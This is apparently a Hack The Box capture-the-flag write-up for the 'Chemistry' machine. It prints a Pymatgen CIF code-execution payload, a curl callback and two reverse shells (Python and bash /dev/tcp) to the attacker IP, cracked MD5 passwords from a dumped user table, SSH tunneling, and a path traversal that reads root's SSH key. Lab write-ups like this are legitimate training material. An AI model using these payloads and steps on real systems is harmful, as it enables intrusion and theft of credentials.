
# HTB - Chemistry

## Machine Information

| Information          | Details                                         |
| -------------------- | ----------------------------------------------- |
| Machine              | Chemistry                                       |
| IP Address           | `10.129.231.170`                                |
| Attacker IP          | `10.10.15.194`                                  |
| Operating System     | Ubuntu Linux                                    |
| Difficulty           | Easy                                            |
| Initial Access       | Pymatgen CIF parser RCE                         |
| Privilege Escalation | Credential reuse, SSH tunneling, CVE-2024-23334 |

# 1. Reconnaissance

We begin with a full TCP port scan using Nmap:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV -oG Allports 10.129.231.170
```

The scan returns two open ports:

```text
22/tcp   open  ssh
5000/tcp open  http
```

The full output was:

```text
# Nmap 7.991 scan initiated Sat Oct  3 05:36:37 2026 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV -oG Allports 10.129.231.170
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.231.170 () Status: Up
Host: 10.129.231.170 () Ports: 22/open/tcp//ssh//OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)/, 5000/open/tcp//upnp?///    Ignored State: closed (65533)
# Nmap done at Sat Oct  3 05:36:59 2026 -- 1 IP address (1 host up) scanned in 21.42 seconds
```

We then perform a more detailed scan against the discovered ports:

```bash
nmap -sCV -p22,5000 10.129.231.170
```

The important results are:

```text
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
5000/tcp open  http  Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
```

The service on port 5000 is particularly interesting because it is a Python web application running with Werkzeug.

# 2. Web Enumeration

We access the application through port 5000.

The website provides both a login and registration functionality.

I first tried common credentials, but they were unsuccessful.

Since registration was available, I created a test account:

```text
Username: test
Password: test
```

After logging in, we are presented with a **CIF Analyzer**.

At this point, it is useful to understand what CIF files are.

A Crystallographic Information File is a structured text format used to represent crystallographic information. A simple example looks like:

```text
data_example

_chemical_name_common             'Sodium chloride'
_chemical_formula_sum             'Na Cl'

_cell_length_a                    5.6402
_cell_length_b                    5.6402
_cell_length_c                    5.6402
_cell_angle_alpha                 90
_cell_angle_beta                  90
_cell_angle_gamma                 90

_symmetry_space_group_name_H-M    'F m -3 m'

loop_
_atom_site_label
_atom_site_type_symbol
_atom_site_fract_x
_atom_site_fract_y
_atom_site_fract_z

Na1  Na  0.00000  0.00000  0.00000
Cl1  Cl  0.50000  0.50000  0.50000
```

The presence of a CIF parser immediately gives us an interesting attack surface.

Rather than spending a long time enumerating the rest of the website first, I decided to investigate whether the application used a vulnerable CIF parsing library.

# 3. Identifying the Pymatgen Vulnerability

The application is written in Python, which is consistent with the Werkzeug server identified by Nmap.

Researching CIF parser vulnerabilities led to the following Pymatgen security advisory:

```text
https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
```

The vulnerability affects Pymatgen's CIF parser and can result in arbitrary code execution.

The proof of concept uses CIF fields containing Python expressions.

A simplified example of the malicious structure is:

```text
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

The important part is the Python expression capable of reaching Python's `BuiltinImporter` and loading the `os` module.

The original proof of concept executes:

```python
os.system("touch pwned")
```

Because this results in arbitrary command execution, we can replace the `touch` command with another command of our choice.

# 4. Confirming Remote Code Execution

Before attempting a reverse shell, I wanted to confirm that the CIF parser was actually executing our commands.

I used:

```text
curl http://10.10.15.194:8000/
```

as the command executed by the vulnerable expression.

On my attacking machine, I monitored incoming traffic:

```bash
tcpdump -i ens33 port 8000
```

After uploading and opening the malicious CIF file, packets arrived at my machine.

This confirmed that the server was executing our injected command.

Therefore, we had confirmed arbitrary command execution.

# 5. Initial Access

Now that RCE was confirmed, the next step was to obtain an interactive shell.

One option was to create a shell script containing a Python reverse shell:

```bash
#!/bin/bash
python3 -c 'import pty,socket,os; s=socket.socket(); s.connect(("10.10.15.194",4444)); [os.dup2(s.fileno(),x) for x in (0,1,2)]; pty.spawn("/bin/bash")'
```

Another simpler option was a Bash reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'
```

I started a listener:

```bash
nc -nlvp 4444
```

Then I executed the reverse shell through the CIF RCE.

The connection was successful, giving us a shell on the target.

The current user was:

```text
app
```

# 6. Local Enumeration

Now that we had a shell as `app`, I started with the usual privilege-enumeration commands:

```bash
id
```

I also checked for Linux capabilities and SUID binaries:

```bash
getcap -r / 2>/dev/null
```

and:

```bash
find / -perm -4000 2>/dev/null
```

Nothing immediately useful was found.

Therefore, I started enumerating the application directory and its files.

One directory stood out:

```text
instance
```

Inside it was:

```text
database.db
```

Since the file had a `.db` extension and the application was a Python web application, SQLite was a strong possibility.

# 7. Extracting Credentials from SQLite

I opened the database with SQLite:

```bash
sqlite3 database.db
```

Inside the SQLite shell, I listed the available tables:

```sql
.tables
```

One interesting table was:

```text
user
```

I then dumped its contents:

```sql
select * from user;
```

The database returned:

```text
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
```

The third column contains password hashes.

I copied the database output into a file and extracted only the hashes:

```bash
cat sqlite-o | cut -d '|' -f 3
```

I then used `hashid` to identify the hash type.

The hashes were identified as MD5.

Another option for cracking these hashes would be CrackStation:

```text
https://crackstation.net
```

Since the hashes are MD5, Hashcat mode `0` is appropriate:

```bash
hashcat -m 0 hashes /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Several hashes were successfully cracked:

```text
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
9ad48828b0955513f7cf0f7f6510c8f8:carlos123
6845c17d298d95aa942127bdad2ceb9b:peterparker
c3601ad2286a4293868ec2a4bc606ba3:victoria123
098f6bcd4621d373cade4e832627b4f6:test
```

The interesting account here is:

```text
rosa:unicorniosrosados
```

# 8. Identifying a Valid SSH User

Before trying the recovered credentials, I checked which local users actually had a Bash shell:

```bash
cat /etc/passwd | grep bash
```

This confirmed that `rosa` was a real interactive user.

Since SSH was exposed on port 22, I reused the recovered credentials:

```bash
ssh rosa@10.129.231.170
```

The credentials worked, giving us an SSH session as `rosa`.

At this point, we could retrieve the user flag.

# 9. Discovering the Internal Service

While enumerating the machine from the `rosa` account, I checked listening TCP sockets:

```bash
ss -tlnp
```

The output included:

```text
State  Recv-Q Send-Q Local Address:Port
LISTEN 0      4096   127.0.0.53%lo:53
LISTEN 0      128    0.0.0.0:22
LISTEN 0      128    0.0.0.0:5000
LISTEN 0      128    127.0.0.1:8080
LISTEN 0      128    [::]:22
```

Port `8080` immediately stood out.

Unlike ports 22 and 5000, which were externally accessible, port 8080 was bound only to:

```text
127.0.0.1:8080
```

This means the service was accessible from the target machine itself but not directly from our attacking machine.

We therefore needed to pivot through the SSH access we had obtained as `rosa`.

# 10. SSH Port Forwarding

I created a local SSH tunnel:

```bash
ssh -L 8080:127.0.0.1:8080 -N -vv rosa@10.129.231.170
```

The `-L` option creates local port forwarding.

The connection can be represented as:

```text
Attacker:8080
      |
      | SSH tunnel
      v
Target:127.0.0.1:8080
```

Now, requests to port 8080 on my attacking machine were forwarded through SSH to the service listening on `127.0.0.1:8080` on the target.

I could therefore access the previously inaccessible web application locally.

# 11. Enumerating the Internal Web Application

With the tunnel established, I enumerated the newly exposed web application.

Using Gobuster and further manual enumeration, I discovered several paths.

Further investigation revealed a file-reading vulnerability in the application.

The vulnerability corresponded to a known security issue:

```text
CVE-2024-23334
```

This vulnerability allows an attacker to perform path traversal and read arbitrary files in vulnerable versions of the affected application.

A public proof of concept was available here:

```text
https://github.com/z3rObyte/CVE-2024-23334-PoC
```

# 12. Exploiting CVE-2024-23334

I used the public proof of concept to exploit the internal service.

One particularly interesting target was:

```text
/root/root.txt
```

The vulnerability allowed us to read the root flag directly.

This completed the machine without requiring a root shell.

# 13. Obtaining a Root Shell

However, the same file-reading vulnerability could also be used to retrieve the root user's SSH private key.

The path used was:

```text
/assets/../../../root/.ssh/id_rsa
```

The server returned the contents of the private key.

After saving the key locally, I could use it for SSH authentication as `root`.

The general process is:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.129.231.170
```

This provides a root SSH session.

# Attack Path

```text
Nmap
    |
    v
Port 5000
    |
    v
Python/Werkzeug Web Application
    |
    v
CIF Analyzer
    |
    v
Pymatgen CIF Parser RCE
    |
    v
Reverse Shell
    |
    v
app
    |
    v
SQLite database
    |
    v
MD5 password hashes
    |
    v
Hashcat
    |
    v
rosa:unicorniosrosados
    |
    v
SSH
    |
    v
127.0.0.1:8080
    |
    v
SSH Local Port Forwarding
    |
    v
Internal Web Application
    |
    v
CVE-2024-23334
    |
    +----------------------+
    |                      |
    v                      v
Read root.txt          Read root SSH key
                           |
                           v
                       SSH as root
```

# Vulnerabilities & Techniques

## Pymatgen CIF Parser RCE

The CIF analyzer used a vulnerable version of Pymatgen whose parser allowed malicious CIF data to execute arbitrary Python code.

This provided the initial foothold.

## Reverse Shell

The confirmed RCE was converted into an interactive reverse shell, resulting in access as:

```text
app
```

## Sensitive Database Exposure

The application stored its SQLite database in the accessible `instance` directory:

```text
instance/database.db
```

The database contained password hashes for multiple users.

## Weak MD5 Password Hashing

The passwords were stored as unsalted MD5 hashes, making them relatively easy to crack with tools such as Hashcat.

One recovered credential was:

```text
rosa:unicorniosrosados
```

## Credential Reuse

The recovered password was reused for the `rosa` SSH account.

This allowed us to move from the web application's `app` user to a real SSH user.

## Internal Service Exposure

The target was running another web service on:

```text
127.0.0.1:8080
```

Because it was bound only to localhost, it was not directly accessible externally.

## SSH Local Port Forwarding

SSH local port forwarding exposed the internal service through our attacking machine:

```bash
ssh -L 8080:127.0.0.1:8080 -N -vv rosa@10.129.231.170
```

## CVE-2024-23334

The internal web application was vulnerable to path traversal through CVE-2024-23334.

This allowed arbitrary file disclosure, including:

```text
/root/root.txt
```

and:

```text
/root/.ssh/id_rsa
```

The latter could be used to obtain a root SSH session.

# Lessons Learned

Chemistry demonstrates a complete multi-stage attack chain where several individually small issues can be combined into a full compromise.

The initial vulnerability was not in the authentication system itself. Instead, the CIF analyzer provided an unexpected attack surface because the backend processed attacker-controlled CIF data with a vulnerable parser.

After obtaining the `app` shell, the SQLite database became the next important source of information. Cracking the weak MD5 hashes revealed credentials that could be reused for SSH.

The `rosa` account then provided access to a service that was intentionally inaccessible from the network because it was bound to `127.0.0.1`. SSH local port forwarding allowed us to reach it.

Finally, CVE-2024-23334 provided arbitrary file disclosure, allowing the root flag and root's SSH private key to be obtained.

The complete chain was:

```text
CIF RCE
    |
    v
app
    |
    v
SQLite
    |
    v
MD5 cracking
    |
    v
rosa
    |
    v
SSH tunneling
    |
    v
Internal service
    |
    v
CVE-2024-23334
    |
    v
root
```

pwned :)))))
